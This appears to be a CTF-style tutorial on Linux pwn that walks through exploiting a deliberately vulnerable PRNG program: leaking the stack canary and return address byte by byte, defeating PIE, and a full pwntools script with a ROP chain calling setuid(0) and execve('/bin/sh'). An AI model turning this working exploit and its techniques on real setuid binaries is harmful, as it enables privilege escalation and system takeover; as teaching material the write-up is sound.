# Introduction to Linux pwn - ROP chains
[Last time](https://github.com/yo-yo-yo-jbo/linux_pwn_ret) I discussed Linux pwn techniques I mentioned overriding the return address.  
We have already ASLR, DEP and NX - make sure you're familiar with those before you continue reading.  
In this post, we will be bypassing all three.

## The challenge
If you want to challenge yourself, I offer the challenge [here](prng) - precompiled to run under x64.  
If you're having a hard time - [source code](prng.c) is available. If you solved it in a different way - please feel free to reach out!  
The reader is encouraged to try the challenge *before continuing*.

## Analysis
First, it's important to run `checksec`:
```
[*] '/home/jbo/pwn/prng'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
As you can see, all protections are enabled! Woah! Let's continue with static code analysis then.  
The challenge provides us with a "PRNG" ((Pseudo-Random-Number-Generator)[https://en.wikipedia.org/wiki/Pseudorandom_number_generator]) utility.  
Here is the code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>

void
prng()
{
	uint8_t buf[16] = { 0 };
	int strength = 0;
	int i = 0;

	for (;;)
	{
		printf("Enter PRNG strength for the next byte [1-16] or choose 0 to finish: ");
		if ((1 != scanf("%d", &strength)) || (0 > strength))
		{
			printf("Invalid PRNG strength.\n");
			return;
		}
		if (0 == strength)
		{
			return;
		}
		for (i = 0; i < strength; i++)
		{
			buf[i] = rand() & 0xFF;
		}
		printf("PRNG byte: %.2x\n", buf[strength-1]);
		printf("PRNG byte: %.2x\n", buf[strength]);
	}
}

int
main()
{
	int choice = 0;
	srand(time(0));

	setvbuf(stdout, NULL, _IONBF, 0);

	printf("Welcome to the military-grade SuperPRNG [TM]!\n");
	for (;;)
	{
		// Implement menu
		printf("1. Generate repeated random bytes (two bytes at a time).\n");
		printf("2. Quit.\n");
		printf("Choice? ");
		if (1 != scanf("%d", &choice) || choice < 1 || choice >= 2)
		{
			printf(2 == choice ? "Quitting, thank you for using the military-grade SuperPRNG [TM]!\n" : "Menu error!\n");
			break;
		}

		// Get random
		prng();
	}

	return 0;
}
```

There are a few interesting parts - let's go one by one:
1. The `main` routine can either cann the `prng` function or quit. Furthermore, the `prng` function can be invoked *repeatedly*. That's quite important - it means the attacker can invoke the `prng` functionality an arbitrary amount of times.
2. The `prng` function has several oddities, with the first one getting a "PRNG strength" (in variable `strength`) from the attacker. While there is a check against negative values, there is no upper bound check, and since that value is used to write to `buf` we have a buffer overflow.
3. The attacker cannot control the contents written to `buf` - for all means and purposes, they are truly random.
4. The `prng` function reveals the last written byte *as well as one beyond that*. This is a classic off-by-one issue, which means an attacker might use that to read one byte *beyond* what's overridden the the PRNG.

Great! The next challenge is getting a read and write primitives, which seems difficult due to the nature of random bytes written to `buf` (and beyond).

### Reading strategy
Let us break down a few tasks:
1. There is no obvious way of bypassing the stack cookie, which means we might have to leak it. The only read primitive we have is one byte beyond the `strength` we provide, which is good, but every time we read we essentially "destroy" all bytes prior to it due to overriding with random bytes.
2. If we're able to leak the stack cookie we could leak the return address too, which means we could bypass ASLR for that particular main module.

One thing we could do is leak the stack cookie and the return address, one byte at a time, but remembering we destroyed all bytes before them.  
However, since `prng` doesn't quit until we choose to - both the return address and the stack cookie will not be used!

### Writing strategy
Note that if we run the `prng` functionality *in reverse*, we could use our 2-byte read primitive and see what was lastly written - if the byte matches what we want then we shrink the buffer we write to by one (decreasing the next `strength` value), otherwise we repeat. If the randomness if good enough (and it is) then it's expected to roughly have 256 attempts per byte, which is not too terrible.  
Let us illustate this - let's say we want to write "JBO" to the `buf[1]`, `buf[2]` and `buf[3]`. We do the following pseudo-code:
1. Use `strength=4` which writes random bytes to `buf[0]`, `buf[1]`, `buf[2]` and `buf[3]`. We see what was written to `buf[3]` as it's written to `stdout`.
2. If the value written to `stdout` matches the character `O` (in `JBO`) then we continue to 3, otherwise we go back to 1.
3. Use `strength=3` and write random bytes to `buf[0]`, `buf[1]` and `buf[2]` and, as before, get the value of `buf[2]`. If it was `B` we continue to step 4, otherwise we repeat.
4. Use `strength=2` and write random bytes to `buf[0]` and `buf[1]`, reading `buf[1]`. If it was `J` then we're done, otherwise we continue.

Using that strategy, we could write an arbitrary buffer to an arbitrary offset in `buf` (excluding `buf[0]`, but who cares).

### Execution strategy
Now we can read and write arbitrary values after `buf` - we could do the following:
1. Use the reading strategy to leak the stack canary, old RBP and the return address - reading `8*3 = 24` bytes, one byte one, and destroying those values.
2. Since we now have the canary value - restoring it before returning from the `prng` function allows us to bypass the stack canary.
3. Since we read the return address we now defeat ASLR for the main module.
4. We use the writing strategy to write inr reverse - the new return address, the old RBP value and the old stack cookie.
5. We return to trigger the exploit and essentially jump to the new return address.

The only question that remains is - what to write in the return address? We defeat ASLR so we can jump anywhere within the main module, but there is no "you_win" function or "give_shell" function.  
Well, the solution is to live-off-the-land, using `ROP`.

### ROP
ROP (Return-Oriented-Programming) is the idea to override the return address with addresses that do simple things and end up with a `ret` instruction. For example:

```assembly
mov rax, 1337
inc rbx
ret
```

Each of those pieces is known as a `ROP gadget`. Since `ret` will basically `pop` the next value to `RIP`, we can "concatenate" those pieces.  
On Intel architecture it's easier to find `ROP gadgets` since the instruction set is very dense, and you can jump to middle of instructions, hence making the CPU interpret them as new instructions. Note not all architectures are like that - for instance, in `ARM64` you can only jump to addresses divisible by 4.  
Luckily, there are great automated utilities to find ROP gadgets for us - I personally like [ROPgadget](https://github.com/JonathanSalwan/ROPgadget). Here's a typical output:

```
ROPgadget --binary ./prng --ropchain
...
p += pack('<Q', 0x0000000000017ac2) # pop rsi ; ret
p += pack('<Q', 0x00000000000ce000) # @ .data
p += pack('<Q', 0x0000000000049bb7) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000004c501) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000017ac2) # pop rsi
...
```

Note this essentially helps you "program" with ROP and even outputs Python code for you. However, this needs some "massaging" due to 2 reasons:
1. We need to handle the difference between the return address and the module base (which is constant).
2. We cannot call `execve` on `/bin/sh` since `/bin/sh` drops privileges by default. We can either use the `-p` argument or call `setuid(0)` (which is what I ended up doing).

### Putting it all together
I started with some simple functions that will represent the read and write functions we mentioned earlier:

```python3
#!/usr/bin/env python3
from pwn import *
import struct
import binascii

# Fine-tunables
CANARY_OFFSET = 24
DIFF_FROM_BASE = 0x998e

def leak_and_destroy(size):
    """
        Leak data from the stack and destroy it in the process.
    """

    # Leak byte by byte
    p = log.progress('Leaking stack data (%d bytes)' % (size,))
    raw_bytes = []
    for i in range(size):
        r.recvuntil(b'finish: ')
        r.sendline(str(CANARY_OFFSET + i).encode())
        r.recvline()
        raw_bytes.append(int(r.recvline().split(b':')[1].strip(), 16))
        p.status('%d/%d' % (i + 1, size))

    # Return as bytes
    raw_bytes = bytes(raw_bytes)
    p.success(binascii.hexlify(raw_bytes).decode())
    return raw_bytes

def bruteforce_write(buffer):
    """
        Writes a buffer at the stack by brute-forcing the PRNG backwards.
    """

    # Writing buffer by brute-forcing in reverse
    p = log.progress('Brute-force writing in reverse (%d bytes)' % (len(buffer),))
    for i in range(len(buffer)):
        while True:
            r.recvuntil(b'finish: ')
            r.sendline(str(CANARY_OFFSET + len(buffer) - i).encode())
            if int(r.recvline().split(b':')[1].strip(), 16) == buffer[len(buffer) - i - 1]:
                p.status(r'%d\%d' % (i + 1, len(buffer)))
                break
    p.success()
```

Note:
1. The `CANARY_OFFSET` constant is the offset of the canary (stack cookie) from `buf`.
2. The `DIFF_FROM_BASE` constant is the difference in bytes between the old return address and the module base.
3. The `leak_and_destroy` function (coolest function name ever) leaks data byte by byte, destroying data from before it.
4. The `bruteforce_write` function writes a buffer starting the canary, but does so in reverse. You can see how we use a brute-force approach against the random bytes to measure each footer byte was properly written.

Next is my ROP:

```python3
def build_rop(base_addr):

    """
        Builds our ROP payload, built with ROPgadget (and some manual work).
            1. To handle PIE we simply calculate a base address ahead of time.
            2. To handle the dropping of EUID privileges by /bin/sh we call setuid(0).
    """

    p = b''

    # setuid(0)
    p += struct.pack('<Q', base_addr + 0x0000000000009fbd) # pop rdi; ret
    p += struct.pack('<Q', 0)                              # argument to setuid(0)
    p += struct.pack('<Q', base_addr + 0x0000000000049bb7) # pop rax ; ret
    p += struct.pack('<Q', 0x69)                           # setuid
    p += struct.pack('<Q', base_addr + 0x0000000000028e12) # syscall ; ret

    # execve() of "/bin/sh"
    p += struct.pack('<Q', base_addr + 0x0000000000017ac2) # pop rsi ; ret
    p += struct.pack('<Q', base_addr + 0x00000000000ce000) # @ .data
    p += struct.pack('<Q', base_addr + 0x0000000000049bb7) # pop rax ; ret
    p += b'/bin//sh'
    p += struct.pack('<Q', base_addr + 0x000000000004c501) # mov qword ptr [rsi], rax ; ret
    p += struct.pack('<Q', base_addr + 0x0000000000017ac2) # pop rsi ; ret
    p += struct.pack('<Q', base_addr + 0x00000000000ce008) # @ .data + 8
    p += struct.pack('<Q', base_addr + 0x000000000003c9e0) # xor rax, rax ; ret
    p += struct.pack('<Q', base_addr + 0x000000000004c501) # mov qword ptr [rsi], rax ; ret
    p += struct.pack('<Q', base_addr + 0x0000000000009fbd) # pop rdi ; ret
    p += struct.pack('<Q', base_addr + 0x00000000000ce000) # @ .data
    p += struct.pack('<Q', base_addr + 0x0000000000017ac2) # pop rsi ; ret
    p += struct.pack('<Q', base_addr + 0x00000000000ce008) # @ .data + 8
    p += struct.pack('<Q', base_addr + 0x000000000008e237) # pop rdx ; pop rbx ; ret
    p += struct.pack('<Q', base_addr + 0x00000000000ce008) # @ .data + 8
    p += struct.pack('<Q', base_addr + 0x4141414141414141) # padding
    p += struct.pack('<Q', base_addr + 0x0000000000049bb7) # pop rax ; ret
    p += struct.pack('<Q', 0x3b)                           # execve
    p += struct.pack('<Q', base_addr + 0x00000000000092a2) # syscall

    # Return the ROP bytes
    return p
```

Most was taken as-is from `ROPGadget`, but I aded add the `base_addr` as an argument.

Lastly, the main functionality:

```python3
# Connect to process and start PRNG with option 1
r = process('./prng')
r.recvuntil(b'Choice? ')
r.sendline(b'1')

# Leak the canary, the old RBP and the return address from the stack
canary, old_rbp, ret_addr = struct.unpack('<QQQ', leak_and_destroy(struct.calcsize('<QQQ')))
log.info('Canary = 0x%.16x' % (canary,))
log.info('RBP frame = 0x%.16x' % (old_rbp,))
log.info('RET addr = 0x%.16x' % (ret_addr,))

# Build the raw ROP and add the old RBP and canary
base_addr = ret_addr - DIFF_FROM_BASE
log.info('Base addr = 0x%.16x' % (base_addr,))
raw_rop = struct.pack('<QQ', canary, old_rbp) + build_rop(base_addr)

# Write the ROP bytes
bruteforce_write(raw_rop)

# Trigger the return
r.recvuntil(b'finish: ')
r.sendline(b'0')

# Interactively enjoy the shell
r.interactive()
```

The entire solution lives under [solve.py] in this repository.

